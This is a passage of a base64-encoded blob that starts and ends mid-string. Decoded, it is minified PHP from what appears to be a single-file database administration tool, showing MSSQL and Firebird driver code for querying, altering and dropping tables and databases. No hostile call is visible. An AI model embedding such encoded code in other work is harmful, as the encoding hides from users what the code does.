NFUlZFUlBST1BFUlRZKCdQcm9kdWN0TGV2ZWwnKSwgU0VSVkVSUFJPUEVSVFkoJ0VkaXRpb24nKSIpOyRLPSRJLT5mZXRjaF9yb3coKTskdGhpcy0+c2VydmVyX2luZm89JHRoaXMtPnJlc3VsdCgic3Bfc2VydmVyX2luZm8gMiIsMikuIiBbJEtbMF1dICRLWzFdIjt9ZWxzZSR0aGlzLT5lcnJvcj1tc3NxbF9nZXRfbGFzdF9tZXNzYWdlKCk7cmV0dXJuKGJvb2wpJHRoaXMtPl9saW5rO31mdW5jdGlvbg0KcXVvdGUoJFApe3JldHVybiInIi5zdHJfcmVwbGFjZSgiJyIsIicnIiwkUCkuIiciO31mdW5jdGlvbg0Kc2VsZWN0X2RiKCRrKXtyZXR1cm4NCm1zc3FsX3NlbGVjdF9kYigkayk7fWZ1bmN0aW9uDQpxdWVyeSgkSCwkX2g9ZmFsc2UpeyRJPW1zc3FsX3F1ZXJ5KCRILCR0aGlzLT5fbGluayk7JHRoaXMtPmVycm9yPSIiO2lmKCEkSSl7JHRoaXMtPmVycm9yPW1zc3FsX2dldF9sYXN0X21lc3NhZ2UoKTtyZXR1cm4NCmZhbHNlO31pZigkST09PXRydWUpeyR0aGlzLT5hZmZlY3RlZF9yb3dzPW1zc3FsX3Jvd3NfYWZmZWN0ZWQoJHRoaXMtPl9saW5rKTtyZXR1cm4NCnRydWU7fXJldHVybg0KbmV3DQpNaW5fUmVzdWx0KCRJKTt9ZnVuY3Rpb24NCm11bHRpX3F1ZXJ5KCRIKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdD0kdGhpcy0+cXVlcnkoJEgpO31mdW5jdGlvbg0Kc3RvcmVfcmVzdWx0KCl7cmV0dXJuJHRoaXMtPl9yZXN1bHQ7fWZ1bmN0aW9uDQpuZXh0X3Jlc3VsdCgpe3JldHVybg0KbXNzcWxfbmV4dF9yZXN1bHQoJHRoaXMtPl9yZXN1bHQpO31mdW5jdGlvbg0KcmVzdWx0KCRILCRvPTApeyRJPSR0aGlzLT5xdWVyeSgkSCk7aWYoIWlzX29iamVjdCgkSSkpcmV0dXJuDQpmYWxzZTtyZXR1cm4NCm1zc3FsX3Jlc3VsdCgkSS0+X3Jlc3VsdCwwLCRvKTt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRfcmVzdWx0LCRfb2Zmc2V0PTAsJF9maWVsZHMsJG51bV9yb3dzO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7JHRoaXMtPl9yZXN1bHQ9JEk7JHRoaXMtPm51bV9yb3dzPW1zc3FsX251bV9yb3dzKCRJKTt9ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7cmV0dXJuDQptc3NxbF9mZXRjaF9hc3NvYygkdGhpcy0+X3Jlc3VsdCk7fWZ1bmN0aW9uDQpmZXRjaF9yb3coKXtyZXR1cm4NCm1zc3FsX2ZldGNoX3JvdygkdGhpcy0+X3Jlc3VsdCk7fWZ1bmN0aW9uDQpudW1fcm93cygpe3JldHVybg0KbXNzcWxfbnVtX3Jvd3MoJHRoaXMtPl9yZXN1bHQpO31mdW5jdGlvbg0KZmV0Y2hfZmllbGQoKXskSj1tc3NxbF9mZXRjaF9maWVsZCgkdGhpcy0+X3Jlc3VsdCk7JEotPm9yZ3RhYmxlPSRKLT50YWJsZTskSi0+b3JnbmFtZT0kSi0+bmFtZTtyZXR1cm4kSjt9ZnVuY3Rpb24NCnNlZWsoJEQpe21zc3FsX2RhdGFfc2VlaygkdGhpcy0+X3Jlc3VsdCwkRCk7fWZ1bmN0aW9uDQpfX2Rlc3RydWN0KCl7bXNzcWxfZnJlZV9yZXN1bHQoJHRoaXMtPl9yZXN1bHQpO319fWNsYXNzDQpNaW5fRHJpdmVyDQpleHRlbmRzDQpNaW5fU1FMe2Z1bmN0aW9uDQppbnNlcnRVcGRhdGUoJFEsJEwsJHpmKXtmb3JlYWNoKCRMDQphcyRPKXskR2g9YXJyYXkoKTskWj1hcnJheSgpO2ZvcmVhY2goJE8NCmFzJHg9PiRYKXskR2hbXT0iJHggPSAkWCI7aWYoaXNzZXQoJHpmW2lkZl91bmVzY2FwZSgkeCldKSkkWltdPSIkeCA9ICRYIjt9aWYoIXF1ZXJpZXMoIk1FUkdFICIudGFibGUoJFEpLiIgVVNJTkcgKFZBTFVFUygiLmltcGxvZGUoIiwgIiwkTykuIikpIEFTIHNvdXJjZSAoYyIuaW1wbG9kZSgiLCBjIixyYW5nZSgxLGNvdW50KCRPKSkpLiIpIE9OICIuaW1wbG9kZSgiIEFORCAiLCRaKS4iIFdIRU4gTUFUQ0hFRCBUSEVOIFVQREFURSBTRVQgIi5pbXBsb2RlKCIsICIsJEdoKS4iIFdIRU4gTk9UIE1BVENIRUQgVEhFTiBJTlNFUlQgKCIuaW1wbG9kZSgiLCAiLGFycmF5X2tleXMoJE8pKS4iKSBWQUxVRVMgKCIuaW1wbG9kZSgiLCAiLCRPKS4iKTsiKSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpiZWdpbigpe3JldHVybg0KcXVlcmllcygiQkVHSU4gVFJBTlNBQ1RJT04iKTt9fWZ1bmN0aW9uDQppZGZfZXNjYXBlKCR0KXtyZXR1cm4iWyIuc3RyX3JlcGxhY2UoIl0iLCJdXSIsJHQpLiJdIjt9ZnVuY3Rpb24NCnRhYmxlKCR0KXtyZXR1cm4oJF9HRVRbIm5zIl0hPSIiP2lkZl9lc2NhcGUoJF9HRVRbIm5zIl0pLiIuIjoiIikuaWRmX2VzY2FwZSgkdCk7fWZ1bmN0aW9uDQpjb25uZWN0KCl7Z2xvYmFsJGI7JGc9bmV3DQpNaW5fREI7JGo9JGItPmNyZWRlbnRpYWxzKCk7aWYoJGctPmNvbm5lY3QoJGpbMF0sJGpbMV0sJGpbMl0pKXJldHVybiRnO3JldHVybiRnLT5lcnJvcjt9ZnVuY3Rpb24NCmdldF9kYXRhYmFzZXMoKXtyZXR1cm4NCmdldF92YWxzKCJFWEVDIHNwX2RhdGFiYXNlcyIpO31mdW5jdGlvbg0KbGltaXQoJEgsJFosJHosJEQ9MCwkcmc9IiAiKXtyZXR1cm4oJHohPT1udWxsPyIgVE9QICgiLigkeiskRCkuIikiOiIiKS4iICRIJFoiO31mdW5jdGlvbg0KbGltaXQxKCRILCRaKXtyZXR1cm4NCmxpbWl0KCRILCRaLDEpO31mdW5jdGlvbg0KZGJfY29sbGF0aW9uKCRtLCRtYil7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIGNvbGxhdGlvbl9uYW1lIEZST00gc3lzLmRhdGFiYXNlcyBXSEVSRSBuYW1lID0gICIucSgkbSkpO31mdW5jdGlvbg0KZW5naW5lcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmxvZ2dlZF91c2VyKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIFNVU0VSX05BTUUoKSIpO31mdW5jdGlvbg0KdGFibGVzX2xpc3QoKXtyZXR1cm4NCmdldF9rZXlfdmFscygiU0VMRUNUIG5hbWUsIHR5cGVfZGVzYyBGUk9NIHN5cy5hbGxfb2JqZWN0cyBXSEVSRSBzY2hlbWFfaWQgPSBTQ0hFTUFfSUQoIi5xKGdldF9zY2hlbWEoKSkuIikgQU5EIHR5cGUgSU4gKCdTJywgJ1UnLCAnVicpIE9SREVSIEJZIG5hbWUiKTt9ZnVuY3Rpb24NCmNvdW50X3RhYmxlcygkbCl7Z2xvYmFsJGc7JEo9YXJyYXkoKTtmb3JlYWNoKCRsDQphcyRtKXskZy0+c2VsZWN0X2RiKCRtKTskSlskbV09JGctPnJlc3VsdCgiU0VMRUNUIENPVU5UKCopIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyIpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnRhYmxlX3N0YXR1cygkQz0iIil7JEo9YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJTRUxFQ1QgbmFtZSBBUyBOYW1lLCB0eXBlX2Rlc2MgQVMgRW5naW5lIEZST00gc3lzLmFsbF9vYmplY3RzIFdIRVJFIHNjaGVtYV9pZCA9IFNDSEVNQV9JRCgiLnEoZ2V0X3NjaGVtYSgpKS4iKSBBTkQgdHlwZSBJTiAoJ1MnLCAnVScsICdWJykgIi4oJEMhPSIiPyJBTkQgbmFtZSA9ICIucSgkQyk6Ik9SREVSIEJZIG5hbWUiKSlhcyRLKXtpZigkQyE9IiIpcmV0dXJuJEs7JEpbJEtbIk5hbWUiXV09JEs7fXJldHVybiRKO31mdW5jdGlvbg0KaXNfdmlldygkUil7cmV0dXJuJFJbIkVuZ2luZSJdPT0iVklFVyI7fWZ1bmN0aW9uDQpma19zdXBwb3J0KCRSKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIGMuKiwgdC5uYW1lIHR5cGUsIGQuZGVmaW5pdGlvbiBbZGVmYXVsdF0NCkZST00gc3lzLmFsbF9jb2x1bW5zIGMNCkpPSU4gc3lzLmFsbF9vYmplY3RzIG8gT04gYy5vYmplY3RfaWQgPSBvLm9iamVjdF9pZA0KSk9JTiBzeXMudHlwZXMgdCBPTiBjLnVzZXJfdHlwZV9pZCA9IHQudXNlcl90eXBlX2lkDQpMRUZUIEpPSU4gc3lzLmRlZmF1bHRfY29uc3RyYWludHMgZCBPTiBjLmRlZmF1bHRfb2JqZWN0X2lkID0gZC5wYXJlbnRfY29sdW1uX2lkDQpXSEVSRSBvLnNjaGVtYV9pZCA9IFNDSEVNQV9JRCgiLnEoZ2V0X3NjaGVtYSgpKS4iKSBBTkQgby50eXBlIElOICgnUycsICdVJywgJ1YnKSBBTkQgby5uYW1lID0gIi5xKCRRKSlhcyRLKXskVT0kS1sidHlwZSJdOyR5PShwcmVnX21hdGNoKCJ+Y2hhcnxiaW5hcnl+IiwkVSk/JEtbIm1heF9sZW5ndGgiXTooJFU9PSJkZWNpbWFsIj8iJEtbcHJlY2lzaW9uXSwkS1tzY2FsZV0iOiIiKSk7JEpbJEtbIm5hbWUiXV09YXJyYXkoImZpZWxkIj0+JEtbIm5hbWUiXSwiZnVsbF90eXBlIj0+JFUuKCR5PyIoJHkpIjoiIiksInR5cGUiPT4kVSwibGVuZ3RoIj0+JHksImRlZmF1bHQiPT4kS1siZGVmYXVsdCJdLCJudWxsIj0+JEtbImlzX251bGxhYmxlIl0sImF1dG9faW5jcmVtZW50Ij0+JEtbImlzX2lkZW50aXR5Il0sImNvbGxhdGlvbiI9PiRLWyJjb2xsYXRpb25fbmFtZSJdLCJwcml2aWxlZ2VzIj0+YXJyYXkoImluc2VydCI9PjEsInNlbGVjdCI9PjEsInVwZGF0ZSI9PjEpLCJwcmltYXJ5Ij0+JEtbImlzX2lkZW50aXR5Il0sKTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQppbmRleGVzKCRRLCRoPW51bGwpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIGkubmFtZSwga2V5X29yZGluYWwsIGlzX3VuaXF1ZSwgaXNfcHJpbWFyeV9rZXksIGMubmFtZSBBUyBjb2x1bW5fbmFtZSwgaXNfZGVzY2VuZGluZ19rZXkNCkZST00gc3lzLmluZGV4ZXMgaQ0KSU5ORVIgSk9JTiBzeXMuaW5kZXhfY29sdW1ucyBpYyBPTiBpLm9iamVjdF9pZCA9IGljLm9iamVjdF9pZCBBTkQgaS5pbmRleF9pZCA9IGljLmluZGV4X2lkDQpJTk5FUiBKT0lOIHN5cy5jb2x1bW5zIGMgT04gaWMub2JqZWN0X2lkID0gYy5vYmplY3RfaWQgQU5EIGljLmNvbHVtbl9pZCA9IGMuY29sdW1uX2lkDQpXSEVSRSBPQkpFQ1RfTkFNRShpLm9iamVjdF9pZCkgPSAiLnEoJFEpLCRoKWFzJEspeyRDPSRLWyJuYW1lIl07JEpbJENdWyJ0eXBlIl09KCRLWyJpc19wcmltYXJ5X2tleSJdPyJQUklNQVJZIjooJEtbImlzX3VuaXF1ZSJdPyJVTklRVUUiOiJJTkRFWCIpKTskSlskQ11bImxlbmd0aHMiXT1hcnJheSgpOyRKWyRDXVsiY29sdW1ucyJdWyRLWyJrZXlfb3JkaW5hbCJdXT0kS1siY29sdW1uX25hbWUiXTskSlskQ11bImRlc2NzIl1bJEtbImtleV9vcmRpbmFsIl1dPSgkS1siaXNfZGVzY2VuZGluZ19rZXkiXT8nMSc6bnVsbCk7fXJldHVybiRKO31mdW5jdGlvbg0KdmlldygkQyl7Z2xvYmFsJGc7cmV0dXJuDQphcnJheSgic2VsZWN0Ij0+cHJlZ19yZXBsYWNlKCd+Xig/OlteW118XFxbW15dXSpdKSpcXHMrQVNcXHMrfmlzVScsJycsJGctPnJlc3VsdCgiU0VMRUNUIFZJRVdfREVGSU5JVElPTiBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5WSUVXUyBXSEVSRSBUQUJMRV9TQ0hFTUEgPSBTQ0hFTUFfTkFNRSgpIEFORCBUQUJMRV9OQU1FID0gIi5xKCRDKSkpKTt9ZnVuY3Rpb24NCmNvbGxhdGlvbnMoKXskSj1hcnJheSgpO2ZvcmVhY2goZ2V0X3ZhbHMoIlNFTEVDVCBuYW1lIEZST00gZm5faGVscGNvbGxhdGlvbnMoKSIpYXMkZCkkSltwcmVnX3JlcGxhY2UoJ35fLip+JywnJywkZCldW109JGQ7cmV0dXJuJEo7fWZ1bmN0aW9uDQppbmZvcm1hdGlvbl9zY2hlbWEoJG0pe3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQplcnJvcigpe2dsb2JhbCRnO3JldHVybg0KbmxfYnIoaChwcmVnX3JlcGxhY2UoJ35eKFxcW1teXV0qXSkrfm0nLCcnLCRnLT5lcnJvcikpKTt9ZnVuY3Rpb24NCmNyZWF0ZV9kYXRhYmFzZSgkbSwkZCl7cmV0dXJuDQpxdWVyaWVzKCJDUkVBVEUgREFUQUJBU0UgIi5pZGZfZXNjYXBlKCRtKS4ocHJlZ19tYXRjaCgnfl5bYS16MC05X10rJH5pJywkZCk/IiBDT0xMQVRFICRkIjoiIikpO31mdW5jdGlvbg0KZHJvcF9kYXRhYmFzZXMoJGwpe3JldHVybg0KcXVlcmllcygiRFJPUCBEQVRBQkFTRSAiLmltcGxvZGUoIiwgIixhcnJheV9tYXAoJ2lkZl9lc2NhcGUnLCRsKSkpO31mdW5jdGlvbg0KcmVuYW1lX2RhdGFiYXNlKCRDLCRkKXtpZihwcmVnX21hdGNoKCd+XlthLXowLTlfXSskfmknLCRkKSlxdWVyaWVzKCJBTFRFUiBEQVRBQkFTRSAiLmlkZl9lc2NhcGUoREIpLiIgQ09MTEFURSAkZCIpO3F1ZXJpZXMoIkFMVEVSIERBVEFCQVNFICIuaWRmX2VzY2FwZShEQikuIiBNT0RJRlkgTkFNRSA9ICIuaWRmX2VzY2FwZSgkQykpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmF1dG9faW5jcmVtZW50KCl7cmV0dXJuIiBJREVOVElUWSIuKCRfUE9TVFsiQXV0b19pbmNyZW1lbnQiXSE9IiI/IigiLm51bWJlcigkX1BPU1RbIkF1dG9faW5jcmVtZW50Il0pLiIsMSkiOiIiKS4iIFBSSU1BUlkgS0VZIjt9ZnVuY3Rpb24NCmFsdGVyX3RhYmxlKCRRLCRDLCRwLCRLYywkcWIsJGxjLCRkLCRLYSwka2YpeyRjPWFycmF5KCk7Zm9yZWFjaCgkcA0KYXMkbyl7JGU9aWRmX2VzY2FwZSgkb1swXSk7JFg9JG9bMV07aWYoISRYKSRjWyJEUk9QIl1bXT0iIENPTFVNTiAkZSI7ZWxzZXskWFsxXT1wcmVnX3JlcGxhY2UoIn4oIENPTExBVEUgKScoXFx3KyknfiIsIlxcMVxcMiIsJFhbMV0pO2lmKCRvWzBdPT0iIikkY1siQUREIl1bXT0iXG4gICIuaW1wbG9kZSgiIiwkWCkuKCRRPT0iIj9zdWJzdHIoJEtjWyRYWzBdXSwxNitzdHJsZW4oJFhbMF0pKToiIik7ZWxzZXt1bnNldCgkWFs2XSk7aWYoJGUhPSRYWzBdKXF1ZXJpZXMoIkVYRUMgc3BfcmVuYW1lICIucSh0YWJsZSgkUSkuIi4kZSIpLiIsICIucShpZGZfdW5lc2NhcGUoJFhbMF0pKS4iLCAnQ09MVU1OJyIpOyRjWyJBTFRFUiBDT0xVTU4gIi5pbXBsb2RlKCIiLCRYKV1bXT0iIjt9fX1pZigkUT09IiIpcmV0dXJuDQpxdWVyaWVzKCJDUkVBVEUgVEFCTEUgIi50YWJsZSgkQykuIiAoIi5pbXBsb2RlKCIsIiwoYXJyYXkpJGNbIkFERCJdKS4iXG4pIik7aWYoJFEhPSRDKXF1ZXJpZXMoIkVYRUMgc3BfcmVuYW1lICIucSh0YWJsZSgkUSkpLiIsICIucSgkQykpO2lmKCRLYykkY1siIl09JEtjO2ZvcmVhY2goJGMNCmFzJHg9PiRYKXtpZighcXVlcmllcygiQUxURVIgVEFCTEUgIi5pZGZfZXNjYXBlKCRDKS4iICR4Ii5pbXBsb2RlKCIsIiwkWCkpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmFsdGVyX2luZGV4ZXMoJFEsJGMpeyR1PWFycmF5KCk7JFdiPWFycmF5KCk7Zm9yZWFjaCgkYw0KYXMkWCl7aWYoJFhbMl09PSJEUk9QIil7aWYoJFhbMF09PSJQUklNQVJZIikkV2JbXT1pZGZfZXNjYXBlKCRYWzFdKTtlbHNlJHVbXT1pZGZfZXNjYXBlKCRYWzFdKS4iIE9OICIudGFibGUoJFEpO31lbHNlaWYoIXF1ZXJpZXMoKCRYWzBdIT0iUFJJTUFSWSI/IkNSRUFURSAkWFswXSAiLigkWFswXSE9IklOREVYIj8iSU5ERVggIjoiIikuaWRmX2VzY2FwZSgkWFsxXSE9IiI/JFhbMV06dW5pcWlkKCRRLiJfIikpLiIgT04gIi50YWJsZSgkUSk6IkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgQUREIFBSSU1BUlkgS0VZIikuIiAoIi5pbXBsb2RlKCIsICIsJFhbMl0pLiIpIikpcmV0dXJuDQpmYWxzZTt9cmV0dXJuKCEkdXx8cXVlcmllcygiRFJPUCBJTkRFWCAiLmltcGxvZGUoIiwgIiwkdSkpKSYmKCEkV2J8fHF1ZXJpZXMoIkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgRFJPUCAiLmltcGxvZGUoIiwgIiwkV2IpKSk7fWZ1bmN0aW9uDQpsYXN0X2lkKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIFNDT1BFX0lERU5USVRZKCkiKTt9ZnVuY3Rpb24NCmV4cGxhaW4oJGcsJEgpeyRnLT5xdWVyeSgiU0VUIFNIT1dQTEFOX0FMTCBPTiIpOyRKPSRnLT5xdWVyeSgkSCk7JGctPnF1ZXJ5KCJTRVQgU0hPV1BMQU5fQUxMIE9GRiIpO3JldHVybiRKO31mdW5jdGlvbg0KZm91bmRfcm93cygkUiwkWil7fWZ1bmN0aW9uDQpmb3JlaWduX2tleXMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiRVhFQyBzcF9ma2V5cyBAZmt0YWJsZV9uYW1lID0gIi5xKCRRKSlhcyRLKXskcT0mJEpbJEtbIkZLX05BTUUiXV07JHFbInRhYmxlIl09JEtbIlBLVEFCTEVfTkFNRSJdOyRxWyJzb3VyY2UiXVtdPSRLWyJGS0NPTFVNTl9OQU1FIl07JHFbInRhcmdldCJdW109JEtbIlBLQ09MVU1OX05BTUUiXTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQp0cnVuY2F0ZV90YWJsZXMoJFMpe3JldHVybg0KYXBwbHlfcXVlcmllcygiVFJVTkNBVEUgVEFCTEUiLCRTKTt9ZnVuY3Rpb24NCmRyb3Bfdmlld3MoJFZoKXtyZXR1cm4NCnF1ZXJpZXMoIkRST1AgVklFVyAiLmltcGxvZGUoIiwgIixhcnJheV9tYXAoJ3RhYmxlJywkVmgpKSk7fWZ1bmN0aW9uDQpkcm9wX3RhYmxlcygkUyl7cmV0dXJuDQpxdWVyaWVzKCJEUk9QIFRBQkxFICIuaW1wbG9kZSgiLCAiLGFycmF5X21hcCgndGFibGUnLCRTKSkpO31mdW5jdGlvbg0KbW92ZV90YWJsZXMoJFMsJFZoLCRZZyl7cmV0dXJuDQphcHBseV9xdWVyaWVzKCJBTFRFUiBTQ0hFTUEgIi5pZGZfZXNjYXBlKCRZZykuIiBUUkFOU0ZFUiIsYXJyYXlfbWVyZ2UoJFMsJFZoKSk7fWZ1bmN0aW9uDQp0cmlnZ2VyKCRDKXtpZigkQz09IiIpcmV0dXJuDQphcnJheSgpOyRMPWdldF9yb3dzKCJTRUxFQ1Qgcy5uYW1lIFtUcmlnZ2VyXSwNCkNBU0UgV0hFTiBPQkpFQ1RQUk9QRVJUWShzLmlkLCAnRXhlY0lzSW5zZXJ0VHJpZ2dlcicpID0gMSBUSEVOICdJTlNFUlQnIFdIRU4gT0JKRUNUUFJPUEVSVFkocy5pZCwgJ0V4ZWNJc1VwZGF0ZVRyaWdnZXInKSA9IDEgVEhFTiAnVVBEQVRFJyBXSEVOIE9CSkVDVFBST1BFUlRZKHMuaWQsICdFeGVjSXNEZWxldGVUcmlnZ2VyJykgPSAxIFRIRU4gJ0RFTEVURScgRU5EIFtFdmVudF0sDQpDQVNFIFdIRU4gT0JKRUNUUFJPUEVSVFkocy5pZCwgJ0V4ZWNJc0luc3RlYWRPZlRyaWdnZXInKSA9IDEgVEhFTiAnSU5TVEVBRCBPRicgRUxTRSAnQUZURVInIEVORCBbVGltaW5nXSwNCmMudGV4dA0KRlJPTSBzeXNvYmplY3RzIHMNCkpPSU4gc3lzY29tbWVudHMgYyBPTiBzLmlkID0gYy5pZA0KV0hFUkUgcy54dHlwZSA9ICdUUicgQU5EIHMubmFtZSA9ICIucSgkQykpOyRKPXJlc2V0KCRMKTtpZigkSikkSlsiU3RhdGVtZW50Il09cHJlZ19yZXBsYWNlKCd+Xi4rXFxzK0FTXFxzK35pc1UnLCcnLCRKWyJ0ZXh0Il0pO3JldHVybiRKO31mdW5jdGlvbg0KdHJpZ2dlcnMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIHN5czEubmFtZSwNCkNBU0UgV0hFTiBPQkpFQ1RQUk9QRVJUWShzeXMxLmlkLCAnRXhlY0lzSW5zZXJ0VHJpZ2dlcicpID0gMSBUSEVOICdJTlNFUlQnIFdIRU4gT0JKRUNUUFJPUEVSVFkoc3lzMS5pZCwgJ0V4ZWNJc1VwZGF0ZVRyaWdnZXInKSA9IDEgVEhFTiAnVVBEQVRFJyBXSEVOIE9CSkVDVFBST1BFUlRZKHN5czEuaWQsICdFeGVjSXNEZWxldGVUcmlnZ2VyJykgPSAxIFRIRU4gJ0RFTEVURScgRU5EIFtFdmVudF0sDQpDQVNFIFdIRU4gT0JKRUNUUFJPUEVSVFkoc3lzMS5pZCwgJ0V4ZWNJc0luc3RlYWRPZlRyaWdnZXInKSA9IDEgVEhFTiAnSU5TVEVBRCBPRicgRUxTRSAnQUZURVInIEVORCBbVGltaW5nXQ0KRlJPTSBzeXNvYmplY3RzIHN5czENCkpPSU4gc3lzb2JqZWN0cyBzeXMyIE9OIHN5czEucGFyZW50X29iaiA9IHN5czIuaWQNCldIRVJFIHN5czEueHR5cGUgPSAnVFInIEFORCBzeXMyLm5hbWUgPSAiLnEoJFEpKWFzJEspJEpbJEtbIm5hbWUiXV09YXJyYXkoJEtbIlRpbWluZyJdLCRLWyJFdmVudCJdKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCnRyaWdnZXJfb3B0aW9ucygpe3JldHVybg0KYXJyYXkoIlRpbWluZyI9PmFycmF5KCJBRlRFUiIsIklOU1RFQUQgT0YiKSwiRXZlbnQiPT5hcnJheSgiSU5TRVJUIiwiVVBEQVRFIiwiREVMRVRFIiksIlR5cGUiPT5hcnJheSgiQVMiKSwpO31mdW5jdGlvbg0Kc2NoZW1hcygpe3JldHVybg0KZ2V0X3ZhbHMoIlNFTEVDVCBuYW1lIEZST00gc3lzLnNjaGVtYXMiKTt9ZnVuY3Rpb24NCmdldF9zY2hlbWEoKXtnbG9iYWwkZztpZigkX0dFVFsibnMiXSE9IiIpcmV0dXJuJF9HRVRbIm5zIl07cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIFNDSEVNQV9OQU1FKCkiKTt9ZnVuY3Rpb24NCnNldF9zY2hlbWEoJGtnKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQp1c2Vfc3FsKCRrKXtyZXR1cm4iVVNFICIuaWRmX2VzY2FwZSgkayk7fWZ1bmN0aW9uDQpzaG93X3ZhcmlhYmxlcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCnNob3dfc3RhdHVzKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KY29udmVydF9maWVsZCgkbyl7fWZ1bmN0aW9uDQp1bmNvbnZlcnRfZmllbGQoJG8sJEope3JldHVybiRKO31mdW5jdGlvbg0Kc3VwcG9ydCgkRGMpe3JldHVybg0KcHJlZ19tYXRjaCgnfl4oY29sdW1uc3xkYXRhYmFzZXxkcm9wX2NvbHxpbmRleGVzfHNjaGVtZXxzcWx8dGFibGV8dHJpZ2dlcnx2aWV3fHZpZXdfdHJpZ2dlcikkficsJERjKTt9JHc9Im1zc3FsIjskemg9YXJyYXkoKTskSWc9YXJyYXkoKTtmb3JlYWNoKGFycmF5KCdOdW1iZXJzJz0+YXJyYXkoInRpbnlpbnQiPT4zLCJzbWFsbGludCI9PjUsImludCI9PjEwLCJiaWdpbnQiPT4yMCwiYml0Ij0+MSwiZGVjaW1hbCI9PjAsInJlYWwiPT4xMiwiZmxvYXQiPT41Mywic21hbGxtb25leSI9PjEwLCJtb25leSI9PjIwKSwnRGF0ZSBhbmQgdGltZSc9PmFycmF5KCJkYXRlIj0+MTAsInNtYWxsZGF0ZXRpbWUiPT4xOSwiZGF0ZXRpbWUiPT4xOSwiZGF0ZXRpbWUyIj0+MTksInRpbWUiPT44LCJkYXRldGltZW9mZnNldCI9PjEwKSwnU3RyaW5ncyc9PmFycmF5KCJjaGFyIj0+ODAwMCwidmFyY2hhciI9PjgwMDAsInRleHQiPT4yMTQ3NDgzNjQ3LCJuY2hhciI9PjQwMDAsIm52YXJjaGFyIj0+NDAwMCwibnRleHQiPT4xMDczNzQxODIzKSwnQmluYXJ5Jz0+YXJyYXkoImJpbmFyeSI9PjgwMDAsInZhcmJpbmFyeSI9PjgwMDAsImltYWdlIj0+MjE0NzQ4MzY0NyksKWFzJHg9PiRYKXskemgrPSRYOyRJZ1skeF09YXJyYXlfa2V5cygkWCk7fSRGaD1hcnJheSgpOyRPZT1hcnJheSgiPSIsIjwiLCI+IiwiPD0iLCI+PSIsIiE9IiwiTElLRSIsIkxJS0UgJSUiLCJJTiIsIklTIE5VTEwiLCJOT1QgTElLRSIsIk5PVCBJTiIsIklTIE5PVCBOVUxMIik7JFNjPWFycmF5KCJsZW4iLCJsb3dlciIsInJvdW5kIiwidXBwZXIiKTskWGM9YXJyYXkoImF2ZyIsImNvdW50IiwiY291bnQgZGlzdGluY3QiLCJtYXgiLCJtaW4iLCJzdW0iKTskZGM9YXJyYXkoYXJyYXkoImRhdGV8dGltZSI9PiJnZXRkYXRlIiwpLGFycmF5KCJpbnR8ZGVjaW1hbHxyZWFsfGZsb2F0fG1vbmV5fGRhdGV0aW1lIj0+IisvLSIsImNoYXJ8dGV4dCI9PiIrIiwpKTt9JFZiWydmaXJlYmlyZCddPSdGaXJlYmlyZCAoYWxwaGEpJztpZihpc3NldCgkX0dFVFsiZmlyZWJpcmQiXSkpeyR3Zj1hcnJheSgiaW50ZXJiYXNlIik7ZGVmaW5lKCJEUklWRVIiLCJmaXJlYmlyZCIpO2lmKGV4dGVuc2lvbl9sb2FkZWQoImludGVyYmFzZSIpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249IkZpcmViaXJkIiwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm5vLCRlcnJvciwkX2xpbmssJF9yZXN1bHQ7ZnVuY3Rpb24NCmNvbm5lY3QoJE4sJFYsJEcpeyR0aGlzLT5fbGluaz1pYmFzZV9jb25uZWN0KCROLCRWLCRHKTtpZigkdGhpcy0+X2xpbmspeyRJaD1leHBsb2RlKCc6JywkTik7JHRoaXMtPnNlcnZpY2VfbGluaz1pYmFzZV9zZXJ2aWNlX2F0dGFjaCgkSWhbMF0sJFYsJEcpOyR0aGlzLT5zZXJ2ZXJfaW5mbz1pYmFzZV9zZXJ2ZXJfaW5mbygkdGhpcy0+c2VydmljZV9saW5rLElCQVNFX1NWQ19TRVJWRVJfVkVSU0lPTik7fWVsc2V7JHRoaXMtPmVycm5vPWliYXNlX2VycmNvZGUoKTskdGhpcy0+ZXJyb3I9aWJhc2VfZXJybXNnKCk7fXJldHVybihib29sKSR0aGlzLT5fbGluazt9ZnVuY3Rpb24NCnF1b3RlKCRQKXtyZXR1cm4iJyIuc3RyX3JlcGxhY2UoIiciLCInJyIsJFApLiInIjt9ZnVuY3Rpb24NCnNlbGVjdF9kYigkayl7cmV0dXJuKCRrPT0iZG9tYWluIik7fWZ1bmN0aW9uDQpxdWVyeSgkSCwkX2